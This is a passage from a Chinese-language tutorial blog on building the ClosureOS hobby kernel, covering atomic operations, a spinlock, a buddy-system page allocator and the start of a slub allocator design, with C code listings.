pgdb_base[pfn].type = PAGE_ACPI_RECLAIMABLE;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_NVS:<br>                pgdb_base[pfn].type = PAGE_NVS;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_BADRAM:<br>                pgdb_base[pfn].type = PAGE_BADRAM;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                pgdb_base[pfn].type = PAGE_UNKNOWN;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            base += PAGE_SIZE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>到目前为止，我们已经 <strong>基本完成进入高半部内核前的准备了</strong> ，接下来我们直接跳转到位于高地址的代码继续进行后续的内核初始化工作</p><h3 id="Extra-添加原子操作与自旋锁支持"><a href="#Extra-添加原子操作与自旋锁支持" class="headerlink" title="Extra. 添加原子操作与自旋锁支持"></a><em>Extra. 添加原子操作与自旋锁支持</em></h3><p>原子操作（atomic operations）指的是独立而 <strong>不可被打断的操作</strong> ，这类操作可以由单个或多个子操作组成， <strong>原子内存操作</strong> 即提供了原子性的内存操作，即在同一时刻仅有单个核心能够访问指定内存，其通常被用来在并发环境中实现同步，比较常用的有：</p><ul><li>原子比较与赋值：对比指定内存位置上值是否与指定值相等，若是则赋予新值，否则报错</li><li>原子自增自减：将指定内存位置上值加一或减一</li><li>原子读写：获取&#x2F;覆写指定内存位置上值</li></ul><p>例如在 x86 下我们可以通过如添加了 <code>lock</code> 前缀的汇编指令在访问内存的同时完成对总线的控制，<strong>从而从硬件层面确保了内存访问的唯一性</strong>：</p><blockquote><p>注：该示例代码未用于 ClosureOS 中</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">uint32_t</span> <span class="hljs-title function_">atomic_xchg</span><span class="hljs-params">(<span class="hljs-keyword">volatile</span> <span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> newval)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> result;<br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;lock; xchgl %0, %1&quot;</span></span><br><span class="hljs-params">        : <span class="hljs-string">&quot;+m&quot;</span> (*addr), <span class="hljs-string">&quot;=a&quot;</span> (result)</span><br><span class="hljs-params">        : <span class="hljs-string">&quot;1&quot;</span> (newval)</span><br><span class="hljs-params">        : <span class="hljs-string">&quot;cc&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 GCC 中，我们可以直接使用 <a href="https://gcc.gnu.org/onlinedocs/gcc-4.1.1/gcc/Atomic-Builtins.html">编译器内置的原子内存访问函数</a> 来实现原子操作，编译器在生成代码时便会自动生成带有 <code>lock</code> 等前缀的指令：</p><p><img src="https://s2.loli.net/2024/06/26/ZD6mkxFzEyc4V9f.png"></p><p>我们将同一时间仅允许一个核心进行访问的资源称为临界资源（critical resource），将访问临界资源的代码称为临界区（critical region）—— <strong>锁</strong> （lock）是一种用来确保在同一时间仅有一个核心进入指定临界区的数据结构，软件设计规范中我们通常要求程序在访问临界资源前需要持有锁，在完成对临界资源的操作后释放锁，从而确保同一时间仅有单个核心在访问该临界资源</p><p>通过原子内存操作中的 <code>比较与交换</code> 操作，我们可以很容易实现一个简单的锁：</p><ul><li>定义一个整形变量作为锁，0 为已释放，1 为仍被持有</li><li>循环调用 GCC 内建函数 <code>__sync_bool_compare_and_swap()</code> 进行原子操作：检测锁变量的值，其为 0 时将其改为 1</li><li>完成操作后将锁变量的值更改为 0</li></ul><p>由于锁在被持有的情况下请求锁的一方会循环不停地检查，因此这种锁被称为 <strong>自旋锁</strong> （spin lock），我们的实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> atomic_compare_and_swap(ptr, oldval, newval) \</span><br><span class="hljs-meta">        __sync_bool_compare_and_swap(ptr, oldval, newval)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> atomic_set(ptr, newval) __sync_lock_test_and_set(ptr, newval)</span><br><br><span class="hljs-comment">/* ... */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPINLOCK_LOCKED 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPINLOCK_FREE 0</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">atomic_t</span> counter;<br>&#125; <span class="hljs-type">spinlock_t</span>;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">spin_lock_init</span><span class="hljs-params">(<span class="hljs-type">spinlock_t</span> *lock)</span><br>&#123;<br>    <span class="hljs-type">atomic_set</span>(&amp;lock-&gt;counter, SPINLOCK_FREE);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">spin_lock</span><span class="hljs-params">(<span class="hljs-type">spinlock_t</span> *lock)</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (!atomic_compare_and_swap(<br>        &amp;lock-&gt;counter, SPINLOCK_FREE, SPINLOCK_LOCKED<br>    )) &#123; &#125;<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">spin_unlock</span><span class="hljs-params">(<span class="hljs-type">spinlock_t</span> *lock)</span><br>&#123;<br>    <span class="hljs-type">atomic_set</span>(&amp;lock-&gt;counter, SPINLOCK_FREE);<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="0x02-页级内存分配器：buddy-system"><a href="#0x02-页级内存分配器：buddy-system" class="headerlink" title="0x02. 页级内存分配器：buddy system"></a>0x02. 页级内存分配器：buddy system</h1><p>我们按管理将内核侧的内存分配分为两部分：一部分是以内存页为单位的粗粒度页级内存分配器，另一部分是从页级内存分配器分配内存页后再将其划分为更多小对象的细粒度内存分配器，本节我们将实现页级内存分配器</p><p><strong>伙伴算法</strong> （ buddy memory allocation ）是笔者所见过的几种页级内存管理算法当中 <strong>比较优雅的一种</strong> ，因此在 ClosureOS 当中我们的页级内存分配器也采用这种算法，我们将这一内存分配器称为 <code>buddy system</code></p><p>我们使用 <code>struct page</code> 结构体来管理空闲的内存页，并将连续的空闲内存页进行分阶 （order） 管理，一份 N 阶的空闲内存页表示 <code>2^N</code> 张连续的空闲内存页，最高阶设为 <code>10</code> ，位于同一阶的空闲内存页通过第一张页的 <code>list</code> 字段连接为双向链表</p><p><img src="https://s2.loli.net/2024/06/22/XRFtE7I5NxB4hyv.png"></p><p>相同阶的两份页面互相称为 buddy，为了方便进行页面管理，简化页面分配模型， <strong>我们将一份 buddy pages 限制为页框号在</strong> <code>1 &lt;&lt; order</code> <strong>上分别为 0 与 1 的两份页面</strong> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">size_t</span> <span class="hljs-title function_">buddy_page_pfn</span><span class="hljs-params">(<span class="hljs-type">pfn_t</span> pfn, <span class="hljs-type">int</span> order)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> pfn ^ (<span class="hljs-number">1</span> &lt;&lt; order);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-keyword">struct</span> page* <span class="hljs-title function_">get_page_buddy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *p, <span class="hljs-type">int</span> order)</span><br>&#123;<br>    <span class="hljs-type">pfn_t</span> pfn = page_to_pfn(p);<br>    <span class="hljs-keyword">return</span> pfn_to_page(buddy_page_pfn(pfn, order));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存页分配：对齐到-2-N-张页，拆高阶页面"><a href="#内存页分配：对齐到-2-N-张页，拆高阶页面" class="headerlink" title="内存页分配：对齐到 2^N 张页，拆高阶页面"></a>内存页分配：对齐到 2^N 张页，拆高阶页面</h2><p>buddy 算法中的分配流程如下：</p><ul><li>首先会将请求的内存大小向 2 的幂次方张内存页大小对齐，之后从对应的下标取出连续内存页，若成功取到则直接返回</li><li>若对应下标链表为空，则会从下一个 order 中取出内存页，一分为二，其中一份装载到当前下标对应链表中，另一份再返还给上层调用，若下一个 order 也为空则会继续向更高的 order 进行该请求过程，直到成功分配或超过最高阶</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">freelist</span>[<span class="hljs-title">MAX_PAGE_ORDER</span>];</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">alloc_page_direct</span>(<span class="hljs-title">int</span> <span class="hljs-title">order</span>)</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">p</span> =</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> allocated = order;<br><br>    <span class="hljs-keyword">while</span> (allocated &lt; MAX_PAGE_ORDER) &#123;<br>        <span class="hljs-keyword">if</span> (!list_empty(&amp;freelist[allocated])) &#123;<br>            p = list_entry(freelist[allocated].next, <span class="hljs-keyword">struct</span> page, <span class="hljs-built_in">list</span>);<br>            list_del(&amp;p-&gt;<span class="hljs-built_in">list</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            allocated++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* failed */</span><br>    <span class="hljs-keyword">if</span> (!p) &#123;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">/* it means that we acquire pages from higher order */</span><br>    <span class="hljs-keyword">if</span> (allocated != order) &#123;<br>        <span class="hljs-comment">/* put half pages back to buddy */</span><br>        allocated--;<br>        <span class="hljs-keyword">while</span> (allocated &gt;= order) &#123;<br>            list_add_next(&amp;freelist[allocated],<br>                          &amp;get_page_buddy(p, allocated)-&gt;<span class="hljs-built_in">list</span>);<br>            allocated--;<br>        &#125;<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>完成内存页分配之后，我们还需要完成对分配的这一组内存页的标记，对于一份 <code>order=N</code> 的连续内存页，我们以其首页作为标识，其余页面则作为附属页，我们通过 <code>is_head</code> 标志位进行标识，并使用一个额外的 order 字段存储当前页面所属连续内存页的 order：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">spinlock_t</span> pgdb_lock;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">alloc_pages</span>(<span class="hljs-title">int</span> <span class="hljs-title">order</span>)</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">p</span> =</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">bool</span> redo = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (order &gt;= MAX_PAGE_ORDER) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    spin_lock(&amp;pgdb_lock);<br><br>redo:<br>    <span class="hljs-comment">/* try to alloc directly */</span><br>    p = __alloc_page_direct(order);<br>    <span class="hljs-keyword">if</span> (p) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">1</span> &lt;&lt; order); i++) &#123;<br>            p[i].is_head = <span class="hljs-literal">false</span>;<br>            p[i].order = order;<br>            p-&gt;is_free = <span class="hljs-literal">false</span>;<br>            list_head_init(&amp;p[i].<span class="hljs-built_in">list</span>);<br>        &#125;<br><br>        p-&gt;is_head = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">/* failed to allocate! try to reclaim memory... */</span><br>    <span class="hljs-keyword">if</span> (!redo) &#123;<br>        __reclaim_memory();<br>        redo = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">goto</span> redo;<br>    &#125;<br><br>out:<br>    spin_unlock(&amp;pgdb_lock);<br><br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>此外，我们设计一个增加页面引用计数的 API ，当页面被引用时我们应当调用该函数增加其引用计数，在 ClosureOS 开发规范中我们应当在分配页面后调用该 API 增加引用计数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">get_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *p)</span><br>&#123;<br>    <span class="hljs-type">atomic_inc</span>(&amp;get_head_page(p)-&gt;ref_count);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存页释放：检测相邻空闲页组，-向上合并"><a href="#内存页释放：检测相邻空闲页组，-向上合并" class="headerlink" title="内存页释放：检测相邻空闲页组， 向上合并"></a>内存页释放：检测相邻空闲页组， 向上合并</h2><p>buddy 算法的内存页释放流程如下：</p><ul><li>检查同一 order 的物理相邻高地址页面，若为空闲则将其脱链，合并成为一份新 pages</li><li>否则，检查同一 order 的物理相邻低地址页面，若为空闲则将其脱链，合并成为一份新 pages</li><li>order 增加，进入下一轮循环直到超过最大 order 或是同一 order 的前向与后向页面都非空闲</li><li>更新所有子页面信息，最后将页面挂到对应 order 的空闲页面链表上</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __free_pages(<span class="hljs-keyword">struct</span> page *p, <span class="hljs-type">int</span> order)<br>&#123;<br>    <span class="hljs-keyword">if</span> (!p) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (order &gt;= MAX_PAGE_ORDER) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    spin_lock(&amp;pgdb_lock);<br><br>    <span class="hljs-comment">/* try to combine nearby pages */</span><br>    <span class="hljs-keyword">while</span> (order &lt; (MAX_PAGE_ORDER - <span class="hljs-number">1</span>)) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">buddy</span>;</span><br><br>        buddy = get_page_buddy(p, order);<br>        <span class="hljs-keyword">if</span> (buddy-&gt;type == PAGE_NORMAL_MEM &amp;&amp; buddy-&gt;is_free &amp;&amp; buddy-&gt;is_head)&#123;<br>            list_del(&amp;buddy-&gt;<span class="hljs-built_in">list</span>);<br>            <span class="hljs-keyword">if</span> (buddy &lt; p) &#123;<br>                p-&gt;is_head = <span class="hljs-literal">false</span>;<br>                p = buddy;<br>            &#125;<br>            order++;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* we can&#x27;t combine forward or backward, just break */</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">1</span> &lt;&lt; order); i++) &#123;<br>        p[i].is_head = <span class="hljs-literal">false</span>;<br>        p[i].is_free = <span class="hljs-literal">true</span>;<br>        p[i].order = order;<br>        p-&gt;ref_count = p-&gt;map_count = <span class="hljs-number">-1</span>;<br>    &#125;<br>    p-&gt;is_head = <span class="hljs-literal">true</span>;<br><br>    list_add_next(&amp;(freelist[order]), &amp;p-&gt;<span class="hljs-built_in">list</span>);<br><br>    spin_unlock(&amp;pgdb_lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>不过我们在 ClosureOS 中通常 <strong>并不直接调用页面释放的这个 API</strong> ，而是根据引用计数的减少来决定是否该释放页面，在引用计数减少为负数值时自动释放该页面，从而将引用计数管理与页面释放相统一，而无需开发者手动检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">put_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *p)</span><br>&#123;<br>    p = get_head_page(p);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-type">atomic_dec</span>(&amp;p-&gt;ref_count) &lt; <span class="hljs-number">0</span>) &#123;<br>        free_pages(p, p-&gt;order);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是，目前还只是比较简陋的基础设计，尚未加入各种异常检测（例如 <code>page::ref_count</code> 小于 <code>-1</code> 的情况），我们将在后续添加上完整的错误处理系统（例如 <code>kernel panic</code> ）后再行补充</p><h1 id="0x03-通用分配器：slub-allocator"><a href="#0x03-通用分配器：slub-allocator" class="headerlink" title="0x03. 通用分配器：slub allocator"></a>0x03. 通用分配器：slub allocator</h1><blockquote><p>注：本章我们 <strong>暂时不考虑动态虚拟内存分配</strong> （即传统的 <code>vmalloc()</code> ），仅考虑基于直接映射区的内存分配</p></blockquote><p>现在我们基于页级内存分配器进行小对象分配器的设计：小对象分配器会先从 buddy system 分配页面，将其分割为多个小对象后，再将符合要求的内存对象返还给上层调用</p><p>对于小对象分配器，我们使用 <strong>slub allocator</strong> ——这是一种应用于 Linux kernel 中的久经检验的内存分配算法，其核心思想如下：</p><ul><li>我们将不同大小的内存对象请求归到不同的内存池进行处理，例如对于大小为 <code>16</code> 字节的内存请求从 <code>kmalloc-16</code> 这一内存池进行分配，对于非对齐的内存分配大小则向上对齐到相应的内存池进行分配</li><li>不同的内存池独立持有一组页面，在需要时自行向 buddy system 进行内存分配请求</li><li>内存池向 buddy system 单次请求得到的一份连续内存页称为 <code>slub</code> ，一张 <code>slub</code> 会被分割为多个相同大小的小内存对象，空闲内存对象间连接成单向链表结构</li></ul><p>slub allocator 的好处在于 <strong>我们并不需要额外的数据字段去记录每个内存对象的状态信息</strong> ，我们使用 direct mapping area 的地址来分割 slub pages，由此很容易能根据内存对象的地址获取到其所属的页面与对应的 <code>page</code> 结构体，同时使用链表组织空闲对象可以让我们很方便地得知当前 slub pages 的状态</p><p>我们使用 <code>page</code> 结构体中的一个字段记录其对应的 slub pages 的空闲对象链表，基本结构如下图所示：</p><p><img src="https://s2.loli.net/2024/06/30/p1Ho9Vv5AWiNlXD.png"></p><blockquote><p>为什么使用二阶指针？主要是因为笔者个人比较喜欢的一种链表迭代写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">page-&gt;freelist = *page-&gt;freelist;<br></code></pre></td></tr></table></figure></blockquote><p>然后是内存池结构的设计，我们使用一个 <code>struct kmem_cache</code> 结构定义一个指定大小的内存池，并为每个内存池设计两个链表：</p><ul><li><code>full</code> ：这个链表上的 slub pages 没有空闲对象</li><li><code>partial</code> 这个链表上的 slub pages 有一定的空闲对象</li></ul><p>此外，我们在 <code>kmem_cache</code> 中记录其所需的 slub pages 上的对象数量等信息</p><blockquote><p>注：本章我们暂时不考虑针对多核的优化（如 cpu 独占的 <code>kmem_cache_cpu</code> ），等到完成多核环境初始化后再行考虑</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br>    <span class="hljs-type">spinlock_t</span> lock;<br>    <span class="hljs-type">size_t</span> obj_size;<br>    <span class="hljs-type">size_t</span> slub_obj_nr;<br>    <span class="hljs-type">size_t</span> slub_order;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">full</span>;</span>      <span class="hljs-comment">/* list of full pages */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">partial</span>;</span>   <span class="hljs-comment">/* list of partial pages */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">slub</span>;</span>          <span class="hljs-comment">/* current slub page */</span><br>    <span class="hljs-type">void</span> **freelist;            <span class="hljs-comment">/* current freelist */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    KOBJECT_16 = <span class="hljs-number">0</span>,<br>    KOBJECT_32,<br>    KOBJECT_64,<br>    KOBJECT_128,<br>    KOBJECT_192,<br>    KOBJECT_256,<br>    KOBJECT_512,<br>    KOBJECT_1K,<br>    KOBJECT_2K,<br>    KOBJECT_4K,<br>    KOBJECT_8K, <span class="hljs-comment">/* max allocation for 2 pages */</span><br>    NR_KOBJECT_SIZE,<br>&#125;;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> <span class="hljs-title">kmem_cache_list</span>[<span class="hljs-title">NR_KOBJECT_SIZE</span>];</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">size_t</span> kmem_cache_obj_sz[NR_KOBJECT_SIZE];<br></code></pre></td></tr></table></figure><p>我们的 <code>kmem_cache</code> 结构如下图所示：</p><p><img src="https://s2.loli.net/2024/06/30/aueUx4hqbP9FZLR.png"></p><p>我们在内存管理模块初始化时进行内存池的初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> kmem_cache_obj_sz[NR_KOBJECT_SIZE] = &#123;<br>    <span class="hljs-number">16</span>, <span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">128</span>,<br>    <span class="hljs-number">192</span>, <span class="hljs-number">256</span>, <span class="hljs-number">512</span>, <span class="hljs-number">1024</span>,<br>    <span class="hljs-number">2048</span>, <span class="hljs-number">4096</span>, <span class="hljs-number">8192</span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">kmem_cache_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_KOBJECT_SIZE; i++) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">kc</span> =</span> &amp;kmem_cache_list[i];<br><br>        <span class="hljs-comment">/* list for partial and full used pages */</span><br>        list_head_init(&amp;kc-&gt;partial);<br>        list_head_init(&amp;kc-&gt;full);<br><br>        <span class="hljs-comment">/* list for current allocation */</span><br>        kc-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>        kc-&gt;slub = <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-comment">/* size for each kmem_cache, times 2 each time */</span><br>        kc-&gt;obj_size = kmem_cache_obj_sz[i];<br>        kc-&gt;slub_order = (kc-&gt;obj_size &gt;&gt; PAGE_SHIFT);<br>        kc-&gt;slub_obj_nr = (PAGE_SIZE &lt;&lt; kc-&gt;slub_order) / kc-&gt;obj_size;<br><br>        <span class="hljs-comment">/* other variables */</span><br>        spin_lock_init(&amp;kc-&gt;lock);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存对象分配策略"><a href="#内存对象分配策略" class="headerlink" title="内存对象分配策略"></a>内存对象分配策略</h2><p>首先是内存对象的分配，我们按照单次请求的大小将请求分为两类：</p><ul><li>对于小于内存池组最大大小的内存请求，我们将请求大小向上对齐到最近的内存池对象大小，从中进行分配</li><li>对于大于内存池组最大大小的内存请求，我们将其对齐到 <code>(2 ^ N) * PAGE_SIZE</code> 大小，从 buddy system 